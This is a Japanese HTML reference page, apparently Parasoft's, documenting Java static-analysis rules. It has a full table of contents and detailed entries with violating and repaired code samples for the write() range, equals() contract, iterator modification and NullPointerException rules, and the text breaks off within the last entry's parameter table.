<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html><head><meta HTTP-EQUIV="Content-Type" Content="text/html; charset=UTF-8"><style>@media print {
    form#docsForm {
        display: none
    }
    .notPrintable {
        display: none
    }
    a {
        text-decoration: none
    }
}
/* book.css */
body {
    font-family: 'Arial', 'Verdana', sans-serif;
    font-size: 11px;
    margin: 10px;
    color: #585858;
}

pre {
    font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', 'Consolas',
        'source-code-pro', monospace;
    margin-top: 3px;
    margin-bottom: 3px;
}

strong {
    font-size: 12px;
    font-weight: bold;
}
/* dtue.css */
body {
    font-family: 'Arial', 'Verdana', sans-serif;
    font-size: 11px;
    margin: 10px;
    color: #585858;
}

pre {
    font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', 'Consolas',
        'source-code-pro', monospace;
    margin-top: 3px;
    margin-bottom: 3px;
}

h1, h3, strong {
    font-size: 12px;
    font-weight: bold;
}

.runninghead {
    display: none
}

.product {
    display: none;
}

.footer {
    display: none;
}

.paragraph {
    line-height: 150%;
    text-align: justify;
}

.paragraph>font {
    color: #5858FF !important;
}

.syntax {
    background-color: #F9F9F9;
    padding: 10px;
    overflow: auto;
}
/* */
ol>li {
    padding: 2px;
}</style></head>
<body>
<span id="top"/>
<img alt="Parasoft ロゴ" src="data:image/png;base64,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"/>
<br/><br/>

<h1>Table of content</h1>
<ol>
<li><a href="#BD.API.ARGWRITE">BD.API.ARGWRITE - write() メソッドが 0 から 255 の範囲外の整数を出力すると信頼してはならない</a></li><li><a href="#BD.API.EQNULL">BD.API.EQNULL - Object.equals(Object) の実装が null 値を適切に処理していることを確認する</a></li><li><a href="#BD.API.EQREFL">BD.API.EQREFL - Object.equals(Object) の実装が再帰的であることを確認する</a></li><li><a href="#BD.CO.ITMOD">BD.CO.ITMOD - Collection を反復処理中に変更しない</a></li><li><a href="#BD.EXCEPT.NP">BD.EXCEPT.NP - NullPointerException を避ける</a></li><li><a href="#BD.OPT.INEFCOL">BD.OPT.INEFCOL - Collection 要素の非効率な削除を防止する </a></li><li><a href="#BD.OPT.INEFMAP">BD.OPT.INEFMAP - Map エントリの非効率な反復を防止する</a></li><li><a href="#BD.OPT.INEFMAPRM">BD.OPT.INEFMAPRM - Map エントリの非効率な削除を防止する</a></li><li><a href="#BD.PB.ARRAY">BD.PB.ARRAY - 配列の境界を超えてアクセスしてはならない</a></li><li><a href="#BD.PB.ARRAYINP">BD.PB.ARRAYINP - 未検証の入力を配列インデックスとして使用しない</a></li><li><a href="#BD.PB.BADSHIFT">BD.PB.BADSHIFT - 誤ったシフト演算を避ける</a></li><li><a href="#BD.PB.CC">BD.PB.CC - 常に同じ値に評価される条件式を避ける</a></li><li><a href="#BD.PB.CHECKRET">BD.PB.CHECKRET - 非 void メソッドの戻り値を必ずチェックする</a></li><li><a href="#BD.PB.DEREF">BD.PB.DEREF - null チェックの前に間接参照しない</a></li><li><a href="#BD.PB.EXCEPT">BD.PB.EXCEPT - 例外を常にキャッチする</a></li><li><a href="#BD.PB.GETPERM">BD.PB.GETPERM - ユーザー定義のクラス ローダーが適用される場合、getPermission() メソッドの呼び出しが想定される</a></li><li><a href="#BD.PB.INTOVERF">BD.PB.INTOVERF - 整数のオーバーフローを避ける</a></li><li><a href="#BD.PB.MULBUF">BD.PB.MULBUF - 単一のバイト ストリームまたは文字ストリームに複数のバッファー付きラッパーを作成してはならない</a></li><li><a href="#BD.PB.NOTEXPLINIT">BD.PB.NOTEXPLINIT - 明示的に初期化する前の使用を避ける</a></li><li><a href="#BD.PB.NOTINITCTOR">BD.PB.NOTINITCTOR - コンストラクターおよび静的イニシャライザーで初期化する前にフィールドを使用しない</a></li><li><a href="#BD.PB.PBIOS">BD.PB.PBIOS - 外部プロセスが入力および出力ストリームをブロックするのを防ぐ</a></li><li><a href="#BD.PB.POVR">BD.PB.POVR - 使用前にメソッド パラメーターを上書きすることを避ける</a></li><li><a href="#BD.PB.STRNULL">BD.PB.STRNULL - 文字列に null を付加しない</a></li><li><a href="#BD.PB.SWITCH">BD.PB.SWITCH - switch 文には到達できないブランチがあってはならない</a></li><li><a href="#BD.PB.VOVR">BD.PB.VOVR - 未使用の値を避ける</a></li><li><a href="#BD.PB.VREADOBJ">BD.PB.VREADOBJ - readObject() メソッドからオーバーライド可能なメソッドを呼び出さない</a></li><li><a href="#BD.PB.ZERO">BD.PB.ZERO - ゼロによる除算を避ける</a></li><li><a href="#BD.RES.FREE">BD.RES.FREE - 解放されたリソースを使用してはならない</a></li><li><a href="#BD.RES.LEAKS">BD.RES.LEAKS - リソースが割り当て解除されていることを確認する</a></li><li><a href="#BD.SECURITY.BUFEXP">BD.SECURITY.BUFEXP - バッファーによってラップされたデータを信頼されていないコードに公開しない</a></li><li><a href="#BD.SECURITY.CANPATH">BD.SECURITY.CANPATH - パスを標準化してから検証するべきである</a></li><li><a href="#BD.SECURITY.FPEXC">BD.SECURITY.FPEXC - 例外値がないか浮動小数点値の入力をチェックする</a></li><li><a href="#BD.SECURITY.PRIVIL">BD.SECURITY.PRIVIL - 特権付きのブロックで汚染されたデータを処理するのを避ける</a></li><li><a href="#BD.SECURITY.REMTMP">BD.SECURITY.REMTMP - 終了の前に一時ファイルを削除する</a></li><li><a href="#BD.SECURITY.SENS">BD.SECURITY.SENS - 機密データの公開を防止する</a></li><li><a href="#BD.SECURITY.SENSLOG">BD.SECURITY.SENSLOG - ログ ファイルに書き込む関数に機密データを渡さない</a></li><li><a href="#BD.SECURITY.SIGCLASS">BD.SECURITY.SIGCLASS - URLClassLoader および java.util.jar が提供するデフォルトの自動シグニチャ検証に依存しない</a></li><li><a href="#BD.SECURITY.SSSD">BD.SECURITY.SSSD - 機密データを安全にシリアライズする</a></li><li><a href="#BD.SECURITY.TDALLOC">BD.SECURITY.TDALLOC - メモリ割り当サイズの決定に使用する前に、汚染されている可能性があるデータを検証する</a></li><li><a href="#BD.SECURITY.TDCMD">BD.SECURITY.TDCMD - コマンド インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDCODE">BD.SECURITY.TDCODE - コードを生成するメソッドで使用する前に、汚染されている可能性があるデータを検証する</a></li><li><a href="#BD.SECURITY.TDDIG">BD.SECURITY.TDDIG - Jakarta Digester インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDENV">BD.SECURITY.TDENV - 環境に対するインジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDFILES">BD.SECURITY.TDFILES - ファイルに対するインジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDFNAMES">BD.SECURITY.TDFNAMES - ファイル名に対するインジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDINPUT">BD.SECURITY.TDINPUT - フォーマット文字列からサニタイズされていないユーザー入力を除外する</a></li><li><a href="#BD.SECURITY.TDJXPATH">BD.SECURITY.TDJXPATH - JXPath インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDLDAP">BD.SECURITY.TDLDAP - LDAP インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDLIB">BD.SECURITY.TDLIB - ライブラリ インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDLOG">BD.SECURITY.TDLOG - ログ偽造から防御する</a></li><li><a href="#BD.SECURITY.TDNET">BD.SECURITY.TDNET - ネットワーク リソース インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDPASSWD">BD.SECURITY.TDPASSWD - 保護されていない認証情報の使用から保護する</a></li><li><a href="#BD.SECURITY.TDRESP">BD.SECURITY.TDRESP - HTTP レスポンス分割から防御する</a></li><li><a href="#BD.SECURITY.TDRFL">BD.SECURITY.TDRFL - Reflection インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDSESSION">BD.SECURITY.TDSESSION - 信頼されていないデータを HTTP セッションに格納しない</a></li><li><a href="#BD.SECURITY.TDSQL">BD.SECURITY.TDSQL - SQL インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDXML">BD.SECURITY.TDXML - XML データ インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDXPATH">BD.SECURITY.TDXPATH - XPath インジェクションから防御する</a></li><li><a href="#BD.SECURITY.TDXSS">BD.SECURITY.TDXSS - XSS の脆弱性の可能性から防御する</a></li><li><a href="#BD.SECURITY.XMLVAL">BD.SECURITY.XMLVAL - 信頼されていない XML を読み取る前にスキーマまたは DTD を使用して検証する</a></li><li><a href="#BD.TRS.DIFCS">BD.TRS.DIFCS - 変数は単一の critical セクションのコンテキストで使用するべきである</a></li><li><a href="#BD.TRS.DLOCK">BD.TRS.DLOCK - ダブル ロックを避ける</a></li><li><a href="#BD.TRS.INSTLOCK">BD.TRS.INSTLOCK - 共有の静的データを保護するためにインスタンス ロックを使用しない</a></li><li><a href="#BD.TRS.LOCK">BD.TRS.LOCK - 解放されていないロックを放棄してはならない</a></li><li><a href="#BD.TRS.ORDER">BD.TRS.ORDER - 異なる順序でロックを獲得しない</a></li><li><a href="#BD.TRS.TSHL">BD.TRS.TSHL - ロックを保持しているときにブロッキング メソッドを使用してはならない</a></li>
</ol>
<a class="notPrintable" id="BD.API.ARGWRITE" href="#top">[Top]</a><br/><br/><STRONG>
write() メソッドが 0 から 255 の範囲外の整数を出力すると信頼してはならない [BD.API.ARGWRITE]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、java.io.OutputStream クラスまたはそのサブクラスの write(int arg) メソッドへの
パラメーターとして渡された値が 0 から 255 の範囲外である場合に違反をレポートします。

デフォルトでは、ルールはパラメーターの値が不明であり、範囲外の可能性がある場合にも
違反をレポートするようパラメータライズされています (「パラメーター」セクションを参照)。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.4


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[パラメーターの値が不明な場合にレポートする] がオンの場合、ルールは以下のケースに対して
違反をレポートします。
- パラメーターの値が 0 から 255 の範囲外だと分かっている
- パラメーターの値が不明であり、0 から 255 の範囲外の可能性がある

このオプションがオフの場合、範囲外だと分かっている値だけが違反としてレポートされます。
このオプションは、デフォルトでオンです。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
このルールは、出力ストリームに書き込まれる値の予期しない切り詰めを防ぐのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public static void main(String[] args)
    {
        // Any input value &gt; 255 will result in unexpected output
        System.out.write(Integer.valueOf(args[0])); // 違反
        System.out.flush();
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public class Repair
{
    public static void main(String[] args)
    {
        // Perform range checking 
        int value = Integer.valueOf(args[0]);
        if (value &lt; 0 || value &gt; 255) {
            throw new ArithmeticException("Value is out of range");
        }
        System.out.write(value); // 違反ではない
        System.out.flush();
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO09-J. Do not rely on the write() method to output integers outside the range 0 to 255  
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/FIO09-J.+Do+not+rely+on+the+write%28%29+method+to+output+integers+outside+the+range+0+to+255">https://wiki.sei.cmu.edu/confluence/display/java/FIO09-J.+Do+not+rely+on+the+write%28%29+method+to+output+integers+outside+the+range+0+to+255</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.API.EQNULL" href="#top">[Top]</a><br/><br/><STRONG>
Object.equals(Object) の実装が null 値を適切に処理していることを確認する [BD.API.EQNULL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、Object.equals(Object) メソッドが null 引数で呼び出された
ときに true を返していないかどうかをチェックします。
このような動作は、x が null 以外の参照値である場合、x.equals(null) は false を
返さなければならないという equals メソッドのルールに反しています。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    @Override
    public boolean equals(Object obj)
    {
        if (obj instanceof Example) {
            return false;
        }
        return true; // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public class Repair
{
    @Override
    public boolean equals(Object obj)
    {
        if (obj instanceof Repair) {
            return true;
        }
        return false;
    } // 違反ではない
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

<A target="_blank" HREF="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals(java.lang.Object)">http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals(java.lang.Object)</A>

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.API.EQREFL" href="#top">[Top]</a><br/><br/><STRONG>
Object.equals(Object) の実装が再帰的であることを確認する [BD.API.EQREFL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、Object.equals(Object) メソッドが引数として渡されたオブジェクトと
同じオブジェクトで呼び出されたときに false を返していないかどうかをチェックします。
このような動作は、x が null 以外の参照値である場合、x.equals(x) は true を
返さなければならないという equals メソッドのルールに反しています。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    int a;

    public boolean equals(Object obj)
    {
        if (obj instanceof Example) {
            return ((Example)obj).a &lt; a; // 違反
        }
        return false;
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public class Repair
{
    int a;

    public boolean equals(Object obj)
    {
        if (obj instanceof Repair) {
            return ((Repair)obj).a == a;
        }
        return false;
    } // 違反ではない
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
MET08-J. Preserve the equality contract when overriding the equals() method
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/MET08-J.+Preserve+the+equality+contract+when+overriding+the+equals%28%29+method">https://wiki.sei.cmu.edu/confluence/display/java/MET08-J.+Preserve+the+equality+contract+when+overriding+the+equals%28%29+method</A>

<A target="_blank" HREF="http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals(java.lang.Object)">http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#equals(java.lang.Object)</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.CO.ITMOD" href="#top">[Top]</a><br/><br/><STRONG>
Collection を反復処理中に変更しない [BD.CO.ITMOD]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、Collection からイテレーターのインスタンスが取得され、
イテレーター自身の remove メソッド以外の方法で Collection が変更された後に、
イテレーターに対する操作が行われている場合、違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.File;
import java.util.Iterator;
import java.util.Set;

public class Example
{
    void disposeAll(Set&lt;File&gt; files)
    {
        Iterator&lt;File&gt; iterator = files.iterator();
        while (iterator.hasNext()) { // 違反
            File file = iterator.next();
            if (file == null) {
                continue;
            }
            // ...
            files.remove(file);
        }
    }
}

問題は、disposeAll() メソッドで files Collection を反復処理している
ループが、files Collection のエントリを削除する remove() を
呼び出していることです。削除がイテレーターを通じて行われていないため、これは
ルール違反になります。



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
コードを再構成し、イテレーターで削除を行うようにします。

import java.io.File;
import java.util.Iterator;
import java.util.Set;

public class Repair
{
    void disposeAll(Set&lt;File&gt; files)
    {
        Iterator&lt;File&gt; iterator = files.iterator();
        while (iterator.hasNext()) { // 違反ではない
            File file = iterator.next();
            if (file == null) {
                continue;
            }
            // ...
            iterator.remove();
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
DCL02-J. Do not modify the collection's elements during an enhanced for statement
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/DCL02-J.+Do+not+modify+the+collection%27s+elements+during+an+enhanced+for+statement">https://wiki.sei.cmu.edu/confluence/display/java/DCL02-J.+Do+not+modify+the+collection%27s+elements+during+an+enhanced+for+statement</A>

SEI CERT Oracle Coding Standard for Java
MSC06-J. Do not modify the underlying collection when an iteration is in progress
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/MSC06-J.+Do+not+modify+the+underlying+collection+when+an+iteration+is+in+progress">https://wiki.sei.cmu.edu/confluence/display/java/MSC06-J.+Do+not+modify+the+underlying+collection+when+an+iteration+is+in+progress</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for Buffer Overruns and Overflow p. 112

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.EXCEPT.NP" href="#top">[Top]</a><br/><br/><STRONG>
NullPointerException を避ける [BD.EXCEPT.NP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
間接参照される各変数または式は、どのフロー パスでも、
間接参照の時点で  null ではない値を持つべきです。
Java では、以下のいずれかの場合に変数または式が間接参照されます。

   * メソッドが呼び出された (a.method())
   * フィールドが要求された  (a.field)
   * 配列の長さが要求された (arr.length)
   * 配列要素が要求された (arr[i])

このルールの違反は通常、未初期化変数を間接参照しているパスを指します。
または、定義されていない要件、実装されていない機能、派生的なユース ケースに
関連するパスを指していることもあります。
システムがどのように使われるか、あるいはシステムがどのような外部からのアクションを
受け取るかに関して開発ステージで行われた仮定を要件に含め、システムに適切に実装する
ことで、システムが誤った使い方をされるのを防ぐ必要があります。
そのような実装がなく、システムが誤って使われる可能性がある場合、
それらのパスは、定義されていない要件、または未実装の機能に関するパスを表しています。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

「通常、(一部のプラットフォームでは) 例外処理が実装されていないかぎり、
NULL ポインターの間接参照の結果としてプロセスが失敗します。例外処理が
使用されている場合でも、安全に処理できる状態にソフトウェアが復帰するのは
非常に困難な可能性があります。」[CWE-476]


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[null チェックのため、変数が null であることがわかっている場合に違反をレポートする] パラメーター グループ

このチェックボックスをオンまたはオフにして、レポートされる違反を指定します。
   * オフの場合、null 値が代入されていることが確実な変数に対してだけ違反がレポートされます。
   * オンの場合、null 値が代入されている場合だけでなく、null チェックによって使用時点での null ポインター参照
      が確実な場合にも違反がレポートされます。

                boolean b = (obj == null); // null チェックによって違反ポイントでの null の間接参照が明白
    ...
    if (b) {
        ...
        obj.toString(); // チェックボックスがオンの場合、違反がレポートされる
    }

[次の可視性の呼び出し先メソッドで null チェックが行われている場合を除く:]
このパラメーターを使用すると、null チェックによって期待しない違反がレポートされるのを軽減できます。
メソッドで null チェックが行われている場合、呼び出し側のメソッドで変数が null の可能性があると仮定するべきか
どうかがパラメーターに基づいて判断されます。次の可視性を指定できます。

   * "public" 
   * "protected および public"
   * "package-private、protected および public" (デフォルト値)
   * "private、package-private、protected および public"

下の表は、foo() の可視性とパラメーターの選択の組み合わせによるルールの動作の違いを表しています。
違反は表中の '+' 印の組み合わせだけにレポートされます。

	                                                         メソッドの可視性 (foo)
